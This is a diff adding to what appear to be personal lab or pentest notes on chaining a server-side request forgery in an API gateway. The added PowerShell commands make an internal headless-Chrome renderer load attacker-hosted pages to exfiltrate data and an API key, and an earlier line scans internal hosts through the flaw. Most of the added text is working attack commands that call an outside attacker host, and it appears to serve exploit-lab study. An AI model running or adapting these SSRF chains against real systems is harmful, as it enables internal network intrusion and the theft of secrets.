@@ -52,3 +52,19 @@ Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddre
 ```powershell
 Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/29' -Ports 8000 -Hosts -Open
 ```
+
+
+headless chrome test powershell:
+```powershell
+iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/test.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+Exfiltration via Javascript. Note that the internal Javascript reaches out to 172.16.16.4:8001 so at this point there are two ssrf targets.
+- 172.16.16.2:9000
+- 172.16.16.4:8001
+```powershell
+iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/exfiltration.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+Exfiltrate api key
+```powershell
+iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/api-key-extraction.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
